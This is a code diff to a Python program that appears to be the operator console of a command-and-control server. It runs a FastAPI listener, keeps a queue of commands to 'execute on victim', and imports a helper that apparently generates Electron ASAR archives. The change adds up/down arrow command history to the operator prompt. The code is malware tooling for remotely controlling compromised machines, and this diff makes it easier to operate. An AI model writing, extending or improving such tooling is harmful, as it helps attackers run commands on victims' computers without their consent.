@@ -2,9 +2,9 @@ from typing import *
 from fastapi import FastAPI, Request
 from fastapi.responses import PlainTextResponse
 import base64
-#import json
 import os
-#import sys
+import keyboard
+import readline
 import threading
 import uvicorn
 from asargen import createAsarFile
@@ -12,6 +12,7 @@ from asargen import createAsarFile
 ADDRESS: str = "127.0.0.1"
 PORT: int = 1337
 CMD_HISTORY: List[str] = []
+HISTORY_INDEX: int = -1
 CMD_QUEUE: List[str] = []
 PAUSE_CMDS: bool = False
 
@@ -69,6 +70,20 @@ class bcolors:
 
 def fancyprint(text: str):
     print("\r" + text + "\n$ ", end="")
+
+def handle_up_arrow():
+    global HISTORY_INDEX
+    if len(CMD_HISTORY) > 0 and HISTORY_INDEX > 0:
+        HISTORY_INDEX -= 1
+        readline.set_startup_hook(lambda: readline.insert_text(CMD_HISTORY[HISTORY_INDEX]))
+        readline.redisplay()
+
+def handle_down_arrow():
+    global HISTORY_INDEX
+    if len(CMD_HISTORY) > 0 and HISTORY_INDEX < len(CMD_HISTORY) -1:
+        HISTORY_INDEX += 1
+        readline.set_startup_hook(lambda: readline.insert_text(CMD_HISTORY[HISTORY_INDEX]))
+        readline.redisplay()
     
 def checkIfNewClient(client):
     if (client not in clients) and (global_lock == False):
@@ -207,9 +222,15 @@ def input_thread():
     global_lock = False
 
     global global_connection
+    global HISTORY_INDEX
 
     while True:
         new_cmd = ""
+
+        keyboard.on_press_key("up", lambda _: handle_up_arrow())
+        keyboard.on_press_key("down", lambda _: handle_down_arrow())
+
+        #keyboard.on_press_key("up", print("up"))
 
         if global_connection:
             new_cmd = input("$ ").lower()
@@ -250,6 +271,7 @@ def input_thread():
         #execute command on victim
         elif new_cmd.strip() != "":
             CMD_QUEUE.append(new_cmd)
+            HISTORY_INDEX = len(CMD_HISTORY)
         #commands queued up
         if len(CMD_QUEUE) > 1:
             print(f"Added '{new_cmd}' to queue...")
